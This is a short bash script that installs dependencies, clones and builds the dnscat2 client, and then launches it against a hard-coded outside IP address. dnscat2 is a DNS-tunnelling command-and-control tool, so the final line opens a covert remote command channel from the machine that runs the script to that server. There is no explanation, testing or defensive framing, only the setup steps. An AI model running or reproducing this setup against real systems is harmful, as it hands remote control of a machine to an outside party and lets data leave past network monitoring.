#!/bin/bash

sudo apt update
sudo apt install build-essential libldns-dev libpcap-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
dnscat --dns server=54.211.145.14
